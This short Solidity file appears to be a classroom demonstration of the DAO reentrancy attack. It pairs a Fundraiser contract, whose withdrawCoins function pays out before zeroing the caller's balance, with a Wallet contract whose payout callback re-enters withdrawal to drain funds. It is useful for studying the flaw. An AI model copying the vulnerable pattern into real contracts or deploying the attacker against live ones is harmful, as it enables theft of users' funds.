pragma solidity ^0.4.24;

// show the DAO attack by Hack

contract Fundraiser {
    mapping(address=>uint) balances;

    function withdrawCoins(){
         // VULNERABLE
        uint withdrawAmount = balances[msg.sender];
        Wallet wallet = Wallet(msg.sender);
        wallet.payout.value(withdrawAmount)();
        
        // this line is not reached before the next recursion!!
        balances[msg.sender] = 0;
    }

    function getBalance() constant returns (uint) {
        return address(this).balance;
    }

    function contribute() payable {
        balances[msg.sender] += msg.value;
    }

    function() payable {

    }
}

contract Wallet {
    uint recursion = 20;

    Fundraiser fundraiser;

    function Wallet(address fundraiserAddress) {
        fundraiser = Fundraiser(fundraiserAddress);
    }

    function contribute(uint amount) {
        fundraiser.contribute.value(amount)();
    }

    function withdraw(){
        fundraiser.withdrawCoins();
    }

    function getBalance() constant returns (uint) {
        return address(this).balance;
    }

    function payout() payable {
         // exploit
        if(recursion>0){
          recursion --;
          fundraiser.withdrawCoins();
        }
    }


    function() payable {

    }
}